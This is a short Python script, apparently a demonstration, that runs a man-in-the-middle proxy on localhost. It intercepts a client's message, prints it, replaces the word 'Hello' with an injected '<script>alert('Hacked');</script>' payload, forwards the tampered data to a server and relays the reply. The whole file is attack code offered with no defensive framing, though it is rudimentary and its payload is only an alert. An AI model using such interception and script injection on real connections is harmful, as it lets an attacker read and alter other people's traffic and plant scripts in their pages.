import socket

# MITM proxy
def mitm_proxy(client_host, client_port, server_host, server_port):
    # Set up a listener for the client
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.bind((client_host, client_port))
    client_socket.listen(1)

    print(f"Listening on {client_host}:{client_port}...")

    while True:
        conn, addr = client_socket.accept()
        print(f"Intercepted connection from {addr}")
        data = conn.recv(1024)  # Receive data from client
        
        if data:
            print(f"Original message: {data.decode()}")

            # Tamper with the data (e.g., inject a script)
            tampered_data = data.decode().replace("Hello", "<script>alert('Hacked');</script>")
            print(f"Tampered message: {tampered_data}")

            # Connect to the server and forward the tampered message
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((server_host, server_port))
            server_socket.send(tampered_data.encode())

            # Receive server's response and forward it to the client
            response = server_socket.recv(1024)
            conn.send(response)

            server_socket.close()
        conn.close()

# Start the MITM proxy
mitm_proxy('127.0.0.1', 3000, '127.0.0.1', 5000)
